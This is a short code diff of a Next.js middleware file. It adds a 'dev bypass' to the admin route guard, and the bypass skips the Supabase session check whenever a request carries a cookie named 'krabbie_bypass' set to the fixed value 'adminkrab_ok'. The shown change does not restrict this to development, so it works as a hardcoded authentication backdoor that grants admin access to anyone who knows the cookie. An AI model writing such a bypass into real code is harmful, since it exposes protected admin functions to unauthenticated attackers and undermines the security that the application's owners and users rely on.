@@ -51,6 +51,9 @@ export async function middleware(request: NextRequest) {
 async function guardAdmin(req: NextRequest, res: NextResponse, pathname: string) {
   if (!isProtected(pathname)) return res
 
+  // Dev bypass via adminkrab cookie
+  if (req.cookies.get('krabbie_bypass')?.value === 'adminkrab_ok') return res
+
   // Check Supabase session
   const supabase = createServerClient(SUPABASE_URL, SUPABASE_ANON, {
     cookies: {
